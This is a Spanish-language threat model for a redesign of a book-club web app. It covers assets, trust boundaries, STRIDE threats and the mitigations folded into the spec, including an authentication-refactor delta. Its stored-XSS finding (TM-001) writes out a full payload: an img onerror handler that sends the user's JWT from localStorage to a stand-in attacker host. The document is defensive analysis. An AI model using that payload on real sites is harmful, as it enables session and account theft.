# Threat Model — FEAT-001: Rediseño visual según el canvas "Regalá un libro"

Spec analizado: `docs/work/FEAT-001/spec.md` (Loops Spec 4; delta de reentrada en § "Delta 2026-11-19"). PRD: `docs/work/FEAT-001/prd.md`. Fecha: 2026-11-19.

## Metadata

| Campo | Valor |
|---|---|
| Architecture Type | Hybrid — SPA React (Vite) servida estáticamente (Vercel) + API Express/PostgreSQL monolítica (sin cambios en este ticket) |
| Exposure Context | Public Internet (`/` y `/app` son públicas; partes de `/app` requieren usuario autenticado; tab Gestionar libros = Admin Interface) |
| Governance Loaded | Yes — `rules/mwdd/security.instructions.md` (plugin MDD). `AGENTS.md` no existe en el repo. |
| Specification Completeness | High — el spec lista archivos, componentes, flujos de datos y sinks por bloque |
| Analysis Confidence Level | High |

## Executive Summary

FEAT-001 es un cambio **solo de presentación** en `librosclub-frontend/`: tokens CSS, fuentes, `ui/` Shadcn, componentes de marca (`FloralSeal`, `Sticker`), `BookCoverCard` y re-estilado de pantallas. No agrega endpoints, schema, dependencias npm, almacenamiento ni flujos de autenticación. La superficie nueva es mínima: (1) un origen externo de fuentes (Google Fonts) movido de `@import` CSS a `<link>` en `index.html`, y (2) un estado `onError` en `BookCoverCard`.

Al re-estilar código existente, el análisis encontró **un XSS almacenado preexistente** (TM-001, HIGH) en los popups de Leaflet de `CercaTuyoTab`, que el Bloque 3 toca para cambiar colores/fuentes, y un sink de URL externa sin validación de esquema (TM-002, MEDIUM) en `BookCoverCard`, que el Bloque 1 reescribe. Ambos tienen mitigación incorporada al spec (D-12, tareas 1.6, 1.7, 3.6; tests T-U-03, T-U-06, T-U-09).

Vectores analizados: 8. Riesgos: C:0 H:1 M:2 L:5. Todos con mitigación en el spec. **Readiness: Conditionally Ready → PASSED** (el único HIGH se contiene con un cambio de diseño puntual ya incorporado al spec).

Identity Model Risk: Low — el ticket no cambia autenticación ni autorización (JWT en header `Authorization`, `authMiddleware` + `allowRoles` en servidor).

## Fase 1 — Activos

| ID | Activo | Clasificación | Sensibilidad | Límites que cruza |
|---|---|---|---|---|
| A-01 | JWT de sesión (`localStorage['libros_token']`, `{ userId, username, role }`) | Credencial | High | TB-01 (header `Authorization`) |
| A-02 | Credenciales de login (email + contraseña en `AuthModal`/`Login`) | Credencial / PII | High | TB-01 (`POST /api/auth/login`, registro) |
| A-03 | Username / email mostrado en UI (sidebar, Landing, chat) | PII | Medium | TB-01 (respuesta API → render) |
| A-04 | Geolocalización del navegador (lat/lng en Cerca tuyo) y coordenadas de clubes | PII (ubicación) | Medium | TB-01 (query string de `GET /api/clubs/nearby`), TB-05 (tiles OSM por zona) |
| A-05 | Datos de tarjeta simulados en `PremiumUpgradeModal` (nombre, número, vencimiento, CVV) | Financiero (simulado) | Medium | Ninguno: quedan en estado del componente, nunca se envían ni persisten (`authAPI.upgradeUser` solo envía el token) |
| A-06 | Contenido generado por usuarios (nombre/ubicación de club, libro actual, posts, mensajes de chat, títulos de catálogo) | Público / UGC | Medium (integridad) | TB-01 → TB-02 (render en el DOM de otros usuarios) |
| A-07 | Capacidades admin (alta/edición/borrado de libros, responder solicitudes) | Operación privilegiada | High | TB-04 |
| A-08 | Disponibilidad de la UI (fuentes, portadas externas) | Disponibilidad | Low | TB-03, TB-06 |

## Fase 2 — Límites de confianza

| ID | Límite | Datos que lo cruzan | Identidad | Autorización |
|---|---|---|---|---|
| TB-01 | Browser (SPA) ↔ API Express | JWT, credenciales, CRUD de libros/clubes/solicitudes, lat/lng | JWT Bearer en header | Servidor: `authMiddleware`, `optionalAuth`, `allowRoles` |
| TB-02 | Datos de la API (UGC de otros usuarios) ↔ DOM del usuario actual | A-06 renderizado en JSX y en el HTML de popups Leaflet | — | — (es un límite de integridad: datos no confiables → contexto HTML) |
| TB-03 | SPA ↔ Google Books (portadas `thumbnail` y `link` llegan vía backend `/api/google-books/*`; las imágenes y el link se cargan/abren directo desde Google) | URLs de imagen y de detalle del libro | — | — |
| TB-04 | Usuario ↔ Admin (UI) | Visibilidad de la tab Gestionar libros y acciones admin | `role` decodificado del JWT en cliente | Servidor (`allowRoles('admin')`); la UI solo oculta |
| TB-05 | SPA ↔ OpenStreetMap tiles | Coordenadas de tile (zona aproximada del usuario) | — | — |
| TB-06 | SPA ↔ Google Fonts (`fonts.googleapis.com` CSS, `fonts.gstatic.com` archivos) | Request de CSS/fuentes (IP, User-Agent, Referer de origen) | — | — |

## Fase 3 — STRIDE por límite

| Componente (spec) | Límite | S | T | R | I | D | E |
|---|---|---|---|---|---|---|---|
| `index.html` + fuentes (B1, 1.1) | TB-06 | N/A (sin identidad) | TM-005 | N/A | TM-006 | TM-007 | N/A |
| Tokens `index.css` / `tailwind.config.ts` / `App.jsx` `MotionConfig` (B1) | — (build-time, sin datos) | Sin amenazas | Sin amenazas | Sin amenazas | Sin amenazas | Sin amenazas | Sin amenazas |
| `ui/` re-estilados (B1, 1.4) | TB-01 | Sin cambio de flujo | Sin cambio (validaciones de callers intactas) | N/A | Sin amenazas | Sin amenazas | Sin amenazas |
| `FloralSeal`, `Sticker` (B1, 1.5) | — (sin datos externos) | — | Sin amenazas (JSX puro, sin `dangerouslySetInnerHTML`) | — | — | — | — |
| `BookCoverCard` + `safeExternalUrl` + `coverPaletteFor` (B1, 1.6–1.7) | TB-03 | N/A | TM-002 | N/A | TM-008 | TM-007 (imagen falla → fallback) | N/A |
| Landing + `AuthModal` (B2) | TB-01 | Sin cambio (login por API) | Sin cambio (validación HTML5 + servidor) | N/A | Sin amenazas (`err.message` como texto React) | N/A | N/A |
| Dashboard / tabs (B3) | TB-01, TB-04 | Sin cambio | Sin cambio | N/A | Sin amenazas nuevas | Sin amenazas | TM-004 |
| `CercaTuyoTab` popups + `escapeHtml` (B3, 3.6) | TB-02, TB-05 | N/A | TM-001 | N/A | TM-001 (robo de A-01) | Sin amenazas | TM-001 (si la víctima es admin) |
| Modales B4 (`PremiumUpgradeModal`, `RequestChatModal`, `ClubDetailSheet`) | TB-01, TB-02 | Sin cambio | Sin cambio (mensajes/posts como texto React) | N/A | TM-003 (A-05) | N/A | N/A |
| Setup Vitest (B1, 1.9) | — (solo dev) | Sin amenazas | Sin amenazas | Sin amenazas | Sin amenazas | Sin amenazas | Sin amenazas |

Repudiation: el ticket no agrega ni modifica operaciones sensibles; la trazabilidad de acciones admin vive en el backend (fuera de alcance). **Sin amenazas en esta categoría.**

## Fase 4 — Identidad y autorización

- Autenticación: servidor (`authMiddleware`, JWT en header `Authorization: Bearer`). Conforme a gobernanza ("tokens en headers, nunca en URLs").
- Autorización: servidor por ruta (`allowRoles`). El cliente decodifica `role` solo para mostrar/ocultar UI (TB-04). El spec (RNF-06) prohíbe cambiar condiciones de render (`isAdmin`, `isPremium`, `token`), así que la superficie no cambia.
- Sin multi-tenant ni service-to-service. **Identity Model Risk: Low.**

## Fase 5 — Flujos de datos

- **Validación de input**: el ticket no agrega inputs. El spec exige conservar las validaciones existentes (`required`, `minLength`, `type`, `maxLength`, valores cerrados de radio) y documenta que la validación autoritativa es la del servidor.
- **Escape de output (sinks)**: JSX escapa por defecto. Sinks no escapados identificados en código que el ticket toca: (a) `L.popup().setContent(templateString)` en `CercaTuyoTab` → TM-001; (b) `href` de `BookCoverCard` → TM-002. Ambos mitigados.
- **Cifrado en tránsito**: Vercel sirve la SPA por HTTPS; Google Fonts, Google Books y OSM por HTTPS. La API usa `VITE_API_URL` (default `http://localhost:3000/api` solo en desarrollo) → ver Security Inquiry SI-01.
- **Cifrado en reposo**: A-01 se guarda en `localStorage` sin cifrar (preexistente, no se modifica; cifrar en el cliente no aporta protección real frente a XSS en el mismo origen — la mitigación efectiva es eliminar sinks XSS, TM-001). A-02 no se persiste en el cliente; su hash en DB es responsabilidad del backend (fuera de alcance). A-05 nunca se persiste ni se transmite.
- **Logging**: el ticket no agrega logs. `NotFound.tsx` mantiene `console.error` de la ruta (sin datos sensibles).

## Fase 6 — Cadena de suministro

- **Sin dependencias npm nuevas** (Vitest 3, Testing Library, jsdom ya están en `devDependencies`; `package-lock.json` committeado).
- **Google Fonts (TB-06)**: ya era dependencia (`@import`); se cambia el mecanismo a `<link>` y se cambian familias. Modelo de confianza: parcial — el recurso es CSS y archivos de fuente (no ejecuta script). No admite SRI (CSS dinámico por User-Agent). TM-005 / TM-006.
- **Google Books / OSM (TB-03, TB-05)**: sin cambios de modelo; datos tratados como no confiables (TM-002).

## Fase 7 — Operacional

- Deploy en Vercel (`vercel.json` solo con rewrites). **No hay Content-Security-Policy** ni otros headers de seguridad → Governance Finding GF-01.
- Secretos: ninguno en el frontend (`VITE_API_URL` no es secreto). El ticket no toca `.env` ni CI/CD (no existe pipeline).

## Critical Architectural Risks

Ninguno.

## Detailed Threats

### [TM-001] XSS almacenado en popups de Leaflet de "Cerca tuyo"
- Severidad: HIGH
- Confianza: HIGH
- Límite de confianza: TB-02 (UGC de la API → DOM), originado en TB-01
- Activo afectado: A-01 (JWT), A-07 (capacidades admin), A-06
- Exposición: Public Internet (`GET /api/clubs/nearby` usa `optionalAuth`: la ven usuarios anónimos y autenticados, incluido admin)
- Movimiento lateral: Yes (robo del JWT de un admin → acciones admin en la API)
- Categoría STRIDE: Tampering / Information Disclosure / Elevation of Privilege

#### Debilidad arquitectural
`CercaTuyoTab.updateMarkers` arma el contenido del popup como template string HTML e interpola `club.nombre`, `club.ubicacion` y `club.currentBookTitle` sin escapar; Leaflet lo inserta como `innerHTML`. El backend (`clubControllers`) solo hace `trim()` del nombre y la ubicación al crear el club. Es la única ruta de la app donde UGC llega a un sink HTML. El Bloque 3 del spec modifica exactamente esta plantilla (colores/fuentes del popup).

#### Escenario de explotación
Un usuario registrado crea un club con lat/lng y `nombre = <img src=x onerror="fetch('https://atacante/?t='+localStorage.libros_token)">`. Cualquier usuario (o el admin) que abra "Cerca tuyo" en la zona y haga click en el marcador ejecuta el script en el origen de LibrosClub; el JWT se exfiltra de `localStorage` y el atacante opera como la víctima (si es admin: alta/edición/borrado del catálogo, responder solicitudes).

#### Impacto de negocio
Toma de cuentas, incluida la cuenta admin; manipulación del catálogo; daño reputacional del trabajo final.

#### Mitigación recomendada (incorporada al spec)
Spec D-12 + tarea 3.6: todo valor dinámico del popup pasa por `escapeHtml` (`lib/escape-html.ts`, escapa `& < > " '`); valores numéricos (`miembros`, `distanceKm`) se fuerzan con `Number(...)`. Test T-U-09 cubre payloads `<script>` y `"><img onerror>`. Además, el spec prohíbe `dangerouslySetInnerHTML` en componentes nuevos o re-estilados. Defensa en profundidad recomendada (fuera de alcance de este ticket): validación de longitud/caracteres en el backend para `nombre`/`ubicacion` y CSP (GF-01). Handoff a SAST: verificar en CODE que no queden interpolaciones sin `escapeHtml` en `CercaTuyoTab.tsx`.

### [TM-002] Esquemas peligrosos en el link externo de `BookCoverCard`
- Severidad: MEDIUM
- Confianza: MEDIUM
- Límite de confianza: TB-03 (Google Books vía backend → `href`)
- Activo afectado: A-01
- Exposición: Public Internet
- Movimiento lateral: No
- Categoría STRIDE: Tampering

#### Debilidad arquitectural
`link` llega de la respuesta de Google Books proxyada por el backend y se usa directo como `href` de "Ver más →". React 18 solo advierte (no bloquea) URLs `javascript:`. La confianza es implícita en un tercero y en el proxy.

#### Escenario de explotación
Si el backend o la respuesta upstream devolviera un `link` con esquema `javascript:` (proxy comprometido, cambio de fuente de datos, o futura reutilización de `BookCoverCard` con datos de la DB como en FEAT-002), el click del usuario ejecutaría script en el origen. Probabilidad baja con Google Books actual; por eso MEDIUM.

#### Impacto de negocio
Robo de sesión puntual de quien haga click.

#### Mitigación recomendada (incorporada al spec)
D-12 + tareas 1.6/1.7: `safeExternalUrl` con allowlist de `http:`/`https:` (parse con `new URL`); si no pasa, no se renderiza el link. Se conserva `target="_blank"` + `rel="noopener noreferrer"`. Tests T-U-03(d)(e) y T-U-06.

### [TM-003] Datos de tarjeta simulados en `PremiumUpgradeModal`
- Severidad: LOW
- Confianza: HIGH
- Límite de confianza: TB-01 (el modal está del lado cliente del límite; los datos no lo cruzan)
- Activo afectado: A-05
- Exposición: Authenticated Users
- Movimiento lateral: No
- Categoría STRIDE: Information Disclosure

#### Debilidad arquitectural
El modal recolecta número de tarjeta y CVV en estado React aunque no los usa. Un rediseño podría, por error, agregar persistencia (p. ej. guardarlos para "recordar") o enviarlos.

#### Escenario de explotación
Ninguno en el diseño actual: los datos no se envían ni persisten.

#### Impacto de negocio
Bajo (pago simulado de un trabajo académico); riesgo de cumplimiento (PCI) solo si se introdujera transmisión/persistencia.

#### Mitigación recomendada (incorporada al spec)
Tarea 4.1 + RNF-06: se conservan atributos, handlers y flujo; el re-estilado no agrega persistencia ni envío. SAST en CODE debe confirmar que `cardNumber`/`cvv` no aparecen en llamadas a `fetch` ni en `localStorage`.

### [TM-004] Gating de UI admin basado en el rol decodificado en cliente
- Severidad: LOW
- Confianza: HIGH
- Límite de confianza: TB-04
- Activo afectado: A-07
- Exposición: Admin Interface
- Movimiento lateral: No
- Categoría STRIDE: Elevation of Privilege

#### Debilidad arquitectural
La sidebar muestra "Gestionar libros" según `jwtDecode(token).role`. Un usuario puede forjar un token local para ver la tab, pero las operaciones admin las rechaza el servidor (`allowRoles('admin')`).

#### Escenario de explotación
Ver la UI admin sin poder ejecutar acciones. Sin escalada real.

#### Impacto de negocio
Ninguno material.

#### Mitigación recomendada (incorporada al spec)
RNF-06 / Bloque 3: no se cambian las condiciones `isAdmin`/`isPremium`/`token`; la autorización sigue siendo del servidor. Sin acción adicional.

### [TM-005] Integridad del CSS de Google Fonts
- Severidad: LOW
- Confianza: MEDIUM
- Límite de confianza: TB-06
- Activo afectado: A-08
- Exposición: Public Internet
- Movimiento lateral: No
- Categoría STRIDE: Tampering

#### Debilidad arquitectural
El stylesheet de fuentes se carga de un tercero sin SRI (no es posible con Google Fonts). Ya existía (`@import`); el ticket solo cambia el mecanismo.

#### Escenario de explotación
Compromiso del CDN de Google sirviendo CSS malicioso (inyección de estilos / exfiltración vía selectores CSS de atributos). Altamente improbable; CSS no ejecuta script.

#### Impacto de negocio
Desfiguración visual; exfiltración limitada teórica.

#### Mitigación recomendada (incorporada al spec)
D-07: un único `<link>` a `fonts.googleapis.com` y `preconnect` solo a los dos hosts de Google; sin scripts de terceros. Alternativa futura (fuera de alcance, ya decidido en PRD — Dependencias: Google Fonts): self-hosting de fuentes.

### [TM-006] Divulgación de IP/Referer a Google Fonts
- Severidad: LOW
- Confianza: HIGH
- Límite de confianza: TB-06
- Activo afectado: A-03 (metadatos de visita)
- Exposición: Public Internet
- Movimiento lateral: No
- Categoría STRIDE: Information Disclosure

#### Debilidad arquitectural
Cada visita envía IP y User-Agent a Google (preexistente). Google Fonts no recibe datos de la app ni el token.

#### Escenario de explotación
Correlación de visitas por un tercero (privacidad).

#### Impacto de negocio
Bajo; relevante solo ante requisitos de privacidad estrictos (no aplican a este trabajo académico).

#### Mitigación recomendada (incorporada al spec)
Se mantiene el mismo proveedor ya aprobado en el PRD; el `<link>` no envía cookies de la app (origen distinto) y no se agrega ningún otro tercero. Self-hosting como mejora futura.

### [TM-007] Disponibilidad ante falla de fuentes o portadas externas
- Severidad: LOW
- Confianza: HIGH
- Límite de confianza: TB-03, TB-06
- Activo afectado: A-08
- Exposición: Public Internet
- Movimiento lateral: No
- Categoría STRIDE: Denial of Service

#### Debilidad arquitectural
La UI depende visualmente de Google Fonts y de imágenes de Google Books.

#### Escenario de explotación
Caída o bloqueo del tercero → texto invisible o portadas rotas.

#### Impacto de negocio
Degradación visual, sin pérdida de funcionalidad.

#### Mitigación recomendada (incorporada al spec)
`display=swap` + stacks de fallback (`Georgia`, `ui-monospace`, `cursive`) (D-07, RNF-07); fallback de color con título/autor en `onError` (RF-06, tarea 1.7, T-U-03).

### [TM-008] Imágenes de portada de origen externo / admin
- Severidad: LOW
- Confianza: HIGH
- Límite de confianza: TB-03 (Google Books), TB-01 (`cover_url` cargado por admin)
- Activo afectado: A-08, A-03
- Exposición: Public Internet
- Movimiento lateral: No
- Categoría STRIDE: Information Disclosure

#### Debilidad arquitectural
`<img src>` con URLs externas permite al dueño del host registrar la carga (pixel de tracking). Un `src` con `javascript:` no se ejecuta en `<img>` en navegadores modernos.

#### Escenario de explotación
Un admin carga un `coverUrl` hacia un host propio para registrar IPs de lectores.

#### Impacto de negocio
Bajo (requiere rol admin, de confianza).

#### Mitigación recomendada (incorporada al spec)
Sin cambio de modelo (comportamiento preexistente y solo para admin); `alt` preservado y fallback `onError`. `loading="lazy"` se conserva para no cargar imágenes fuera de pantalla.

## Governance Findings

### [GF-01] Ausencia de Content-Security-Policy (preexistente)
- Severidad: MEDIUM · Confianza: HIGH
- Política: `security.instructions.md` § XSS Prevention — "Content Security Policy (CSP) headers".
- Estado: `vercel.json` no define headers; no hay `<meta http-equiv="Content-Security-Policy">`. Preexistente, no introducido por FEAT-001.
- Tratamiento en este ticket: el control primario de la misma política ("Escapar output en HTML"; "No usar innerHTML… con input de usuario") se cumple en todo el código que el ticket toca — `escapeHtml` en el único sink HTML con UGC (TM-001), allowlist de esquemas en `href` (TM-002), prohibición de `dangerouslySetInnerHTML`. Agregar una CSP requiere conocer el origen de `VITE_API_URL` por entorno y los hosts de imágenes de Google Books (dato de despliegue no especificado, ver SI-01), y cambiar configuración de deploy queda fuera del alcance funcional del PRD (cambio solo visual). Recomendación: ticket de hardening posterior con CSP (`default-src 'self'`; `style-src 'self' https://fonts.googleapis.com 'unsafe-inline'`; `font-src https://fonts.gstatic.com`; `img-src 'self' https: data:`; `connect-src 'self' <VITE_API_URL>`; `script-src 'self'`).

### [GF-02] Política "Escapar output en HTML" — incumplimiento preexistente en `CercaTuyoTab`
- Severidad: HIGH · Confianza: HIGH
- Resuelto en este ticket por TM-001 (Bloque 3, tarea 3.6).

## Security Inquiries

- **SI-01 (MEDIUM)** — Fase 5 / TB-01 / A-01, A-02: ¿`VITE_API_URL` en el despliegue de producción apunta a un origen `https://`? El default de código es `http://localhost:3000/api` (solo desarrollo). No bloquea este ticket (no cambia el transporte), pero condiciona el cifrado en tránsito de credenciales y JWT, y los valores de una futura CSP (GF-01).

## Mitigaciones incorporadas al spec

1. `escapeHtml` en todo valor dinámico de popups Leaflet (`CercaTuyoTab`) — Bloque 3, tarea 3.6, T-U-09 (TM-001 / GF-02).
2. `safeExternalUrl` (allowlist `http:`/`https:`) para el `href` de `BookCoverCard`; `rel="noopener noreferrer"` preservado — Bloque 1, tareas 1.6–1.7, T-U-03, T-U-06 (TM-002).
3. Prohibición de `dangerouslySetInnerHTML` en componentes nuevos/re-estilados — sección "Seguridad" del spec y verificación final por grep.
4. Conservación estricta de flujos de datos, validaciones y condiciones de render (RNF-06) — TM-003, TM-004.
5. `display=swap` + fallbacks tipográficos + fallback de portada `onError` — TM-007.

## Resultado

PASSED — Conditionally Ready. Riesgos: C:0 H:1 M:2 (TM-002, GF-01) L:5. El único HIGH (TM-001) tiene mitigación incorporada al spec.


---

# Delta 2026-11-19 — reentrada CODE→PLAN→DEFINE→PLAN (PRD Loops 1, Spec Loops 3)

Alcance del delta: Bloque 5 (favicon SVG, query de `getGoogleFeed` sin `orderBy`, re-sincronización de modo en `AuthModal`), tarea 4.5 ya implementada (refactor `routes/auth.js` → `controllers/authControllers.js` con tests, `npm audit fix`, `node_modules` del backend fuera de git, tipado sin `any`, `@vitest/coverage-v8`) y el smoke de 40 rutas de VERIFY contra la base local.

## Metadata (delta)

| Campo | Valor |
|---|---|
| Architecture Type | Hybrid (sin cambios) — el delta agrega cambios en el monolito Express sin cambiar contratos |
| Exposure Context | Public Internet (`/api/auth/*`, `/api/google-books/*` públicas); Developer workstation para el smoke |
| Governance Loaded | Yes — `security.instructions.md` |
| Specification Completeness | High |
| Analysis Confidence Level | High |

## Activos y límites nuevos

| ID | Activo | Clasificación | Sensibilidad |
|---|---|---|---|
| A-09 | `GOOGLE_BOOKS_API_KEY` (backend `.env`) | Secreto de infraestructura | Medium |
| A-10 | Credenciales del admin local usadas por el smoke (`SMOKE_ADMIN_USERNAME`/`SMOKE_ADMIN_PASSWORD`) | Credencial | High |
| A-11 | Base PostgreSQL local (datos de desarrollo) | Datos de usuario de desarrollo (PII posible) | Medium |
| A-12 | Árbol de dependencias y lockfiles (`package-lock.json` de ambos proyectos) | Integridad de supply chain | Medium |
| A-13 | Hashes de contraseña y emisión de JWT en `authControllers` | Credencial | High |

| ID | Límite | Datos que lo cruzan |
|---|---|---|
| TB-07 | API Express ↔ Google Books API | `q=subject:<topic>`, paginación, `key` (A-09) |
| TB-08 | Workstation/CI ↔ registro npm | paquetes y versiones (A-12) |
| TB-09 | Script de smoke (VERIFY) ↔ API local ↔ PostgreSQL local | A-10, A-11, tokens de prueba |
| TB-10 | Repositorio git ↔ colaboradores/remoto | contenido versionado (antes incluía `node_modules`) |

## STRIDE (delta)

| Componente | Límite | S | T | R | I | D | E |
|---|---|---|---|---|---|---|---|
| `public/favicon.svg` (5.1) | TB-06 (asset estático mismo origen) | N/A | TM-009 | N/A | Sin amenazas | Sin amenazas | N/A |
| `getGoogleFeed` sin `orderBy` (5.2) | TB-07 | N/A | Sin amenazas (params vía `URLSearchParams`) | N/A | TM-010 | TM-011 | N/A |
| `AuthModal` re-sincroniza modo (5.3) | TB-01 | Sin cambio | Sin cambio | N/A | TM-012 (positivo: limpia campos) | N/A | N/A |
| `authControllers` (4.5) | TB-01 | TM-013 | TM-013 | Sin cambio (sin logging nuevo) | TM-013 | Sin cambio (`loginLimiter` intacto) | TM-013 (rol forzado `user`) |
| `npm audit fix`, `@vitest/coverage-v8` (4.5) | TB-08 | N/A | TM-014 | N/A | N/A | N/A | N/A |
| `node_modules` fuera de git (4.5) | TB-10 | N/A | Sin amenazas (reduce superficie) | N/A | Sin amenazas | N/A | N/A |
| Smoke de 40 rutas (VERIFY) | TB-09 | N/A | TM-015 | N/A | TM-015 | TM-015 | N/A |

Repudiation: sin operaciones sensibles nuevas; el refactor no elimina logs existentes. **Sin amenazas en esta categoría.**

## Detailed Threats (delta)

### [TM-009] Favicon SVG como vector de contenido activo
- Severidad: LOW · Confianza: HIGH
- Límite de confianza: TB-06 (asset del mismo origen servido por Vercel)
- Activo afectado: A-01 (si un SVG con script se abriera directo en el origen)
- Exposición: Public Internet · Movimiento lateral: No · STRIDE: Tampering
#### Debilidad arquitectural
Un SVG servido desde el mismo origen puede contener `<script>` o `<foreignObject>` que se ejecutan si el archivo se abre como documento (`/favicon.svg`). Como `<link rel="icon">` no ejecuta script.
#### Escenario de explotación
Solo si alguien commitea un SVG con script; el archivo es de autoría propia y estático.
#### Impacto de negocio
Bajo.
#### Mitigación recomendada (incorporada al spec)
D-13 + 5.1: SVG solo con `rect`/`circle`; T-U-14 falla si aparece `<script`, `<foreignObject`, `<text` o `http`.

### [TM-010] Exposición de la API key de Google Books
- Severidad: LOW · Confianza: HIGH
- Límite de confianza: TB-07
- Activo afectado: A-09
- Exposición: Public Internet · Movimiento lateral: No · STRIDE: Information Disclosure
#### Debilidad arquitectural
La key viaja en la query hacia Google (diseño de la API de Google) y aparece en `err.message` cuando Google responde error (`Google Books error <status>: <rawText>`).
#### Escenario de explotación
Ninguno nuevo: el controller responde un mensaje genérico (`500 { message: 'Error al obtener feed de Google Books' }`) y el detalle va solo a `console.error` del servidor. El cambio de 5.2 no toca ese manejo.
#### Impacto de negocio
Bajo (cuota de una key gratuita).
#### Mitigación recomendada (incorporada al spec)
5.2 conserva la key solo en el servidor y el mensaje genérico al cliente (AC-30, T-B-02 (c)). El test usa `key=test-key`, sin secretos reales. Se recomienda (fuera de alcance) restringir la key por API y por IP en Google Cloud.

### [TM-011] Consumo de cuota de Google Books por cambio de query
- Severidad: LOW · Confianza: MEDIUM
- Límite de confianza: TB-07
- Activo afectado: A-08, A-09
- Exposición: Public Internet · Movimiento lateral: No · STRIDE: Denial of Service
#### Debilidad arquitectural
`GET /api/google-books/feed` es público y cada combinación nueva de `topic`/`page` sale a Google. Quitar `orderBy` no cambia la cantidad de llamadas; la caché en memoria con TTL sigue amortiguando.
#### Escenario de explotación
Un cliente itera `page` para agotar la cuota diaria (preexistente).
#### Impacto de negocio
Feed y Buscar sin resultados hasta el reset de cuota.
#### Mitigación recomendada (incorporada al spec)
Sin cambio de exposición: `limit` acotado a 40 y caché TTL intacta (D-14). Rate limit en `/api/google-books` queda como recomendación de hardening (fuera de alcance; no hay cambio de contrato permitido).

### [TM-012] Persistencia de credenciales tipeadas entre aperturas de `AuthModal`
- Severidad: LOW · Confianza: HIGH
- Límite de confianza: TB-01 (lado cliente)
- Activo afectado: A-02
- Exposición: Public Internet · Movimiento lateral: No · STRIDE: Information Disclosure
#### Debilidad arquitectural
Antes del fix, al cerrar y reabrir el modal (que sigue montado) quedaban el modo y potencialmente los campos de la apertura anterior.
#### Escenario de explotación
Equipo compartido: otra persona reabre el modal y ve el email tipeado.
#### Impacto de negocio
Bajo.
#### Mitigación recomendada (incorporada al spec)
D-15: el efecto de apertura limpia email y contraseña (`setUsername('')`, `setPassword('')`) además de re-sincronizar el modo; T-U-15 (c) verifica campos vacíos al reabrir.

### [TM-013] Regresión de seguridad en el refactor de autenticación
- Severidad: MEDIUM · Confianza: HIGH
- Límite de confianza: TB-01
- Activo afectado: A-13, A-01, A-07
- Exposición: Public Internet · Movimiento lateral: Yes (un registro con rol `admin` daría acceso admin) · STRIDE: Spoofing / Tampering / Elevation of Privilege / Information Disclosure
#### Debilidad arquitectural
Mover login/registro/upgrade a un controller puede perder sin querer controles existentes: rol forzado en registro, comparación con `bcrypt`, mismo mensaje para usuario inexistente y contraseña incorrecta (anti-enumeración), queries parametrizadas, `authMiddleware` en upgrade, `loginLimiter` montado por path.
#### Escenario de explotación
`POST /api/auth/register` con `{ "role": "admin" }` si se perdiera el forzado de rol → escalada a admin.
#### Impacto de negocio
Toma de control del catálogo.
#### Mitigación recomendada (incorporada al spec)
4.5 (ya implementado) conserva el contrato y RF-25 exige rol `user` forzado; T-B-01 cubre 401 para usuario inexistente y para contraseña incorrecta, 409 en duplicado, rol `user` forzado y 500 sin filtrar detalle; `routes/auth.js` mantiene `authMiddleware` en `PUT /upgrade` y `app.js` mantiene `loginLimiter` en `/api/auth/login` y `/api/auth/register` (verificado por lectura; el smoke T-M-11 lo confirma con 401 sin token en upgrade). SAST de CODE debe confirmar queries parametrizadas en `authControllers.js`.

### [TM-014] Integridad de dependencias actualizadas
- Severidad: LOW · Confianza: MEDIUM
- Límite de confianza: TB-08
- Activo afectado: A-12
- Exposición: Internal (build) · Movimiento lateral: No · STRIDE: Tampering
#### Debilidad arquitectural
`npm audit fix` y la nueva devDependency cambian el árbol resuelto; un paquete comprometido en el registro entraría en el lockfile.
#### Escenario de explotación
Typosquatting o versión maliciosa publicada dentro del rango semver.
#### Impacto de negocio
Ejecución de código en build/dev.
#### Mitigación recomendada (incorporada al spec)
Sin `--force` ni saltos major (RF-27, T-M-12); `@vitest/coverage-v8` fijada en versión exacta `3.2.4` alineada con Vitest; lockfiles versionados (gobernanza: "Lockfile siempre committeado"); backend con 0 vulnerabilidades en `npm audit --omit=dev`; advisories restantes del frontend registrados como DT-06. Sacar `node_modules` de git (RF-28) elimina binarios no auditables del repositorio.

### [TM-015] Smoke de escrituras contra una base equivocada o con credenciales expuestas
- Severidad: MEDIUM · Confianza: HIGH
- Límite de confianza: TB-09
- Activo afectado: A-10, A-11
- Exposición: Developer workstation · Movimiento lateral: No · STRIDE: Tampering / Information Disclosure / Denial of Service
#### Debilidad arquitectural
El smoke ejecuta `POST`/`PUT`/`DELETE` y un teardown SQL. Mal apuntado (Railway/producción) borraría o alteraría datos reales; las credenciales admin podrían quedar en el script, en la historia de la shell o en el reporte. Disparar demasiados logins activa el `loginLimiter` (DoS sobre la propia IP).
#### Escenario de explotación
`SMOKE_BASE_URL` o `.env` apuntando a la base remota; teardown con `LIKE` amplio borrando usuarios reales.
#### Impacto de negocio
Pérdida de datos; exposición de credenciales admin.
#### Mitigación recomendada (incorporada al spec)
"Verificación final — Smoke de 40 rutas": guarda que aborta si la API o `DB_HOST` no son locales; credenciales admin solo por variables de entorno, nunca impresas ni versionadas; datos con prefijo único `smoke_feat001_` y teardown que filtra por ids registrados + prefijo con parámetros (no concatenación) dentro de una transacción; conteo final = 0 por tabla; presupuesto de ≤ 7 requests al limiter y reintento único ante `429`, sin desactivar el limiter.

## Governance Findings (delta)

- Conforme: queries parametrizadas en `authControllers` (§ SQL Injection), tokens en header (§ Authentication), secretos por `.env` y `GOOGLE_BOOKS_API_KEY` fuera del código (§ Secrets), lockfiles versionados (§ Dependency Security).
- GF-01 (CSP, MEDIUM, preexistente) sigue vigente y ahora figura como DT-05 en `deuda-tecnica.md`, fuera del alcance del PRD.

## Security Inquiries (delta)

- SI-01 sigue abierta (HTTPS de `VITE_API_URL` en producción).

## Resultado (delta)

PASSED — Conditionally Ready. Delta: C:0 H:0 M:2 (TM-013, TM-015) L:5 (TM-009..TM-012, TM-014), todos con mitigación incorporada al spec. Acumulado del ticket: C:0 H:1 M:4 L:10.
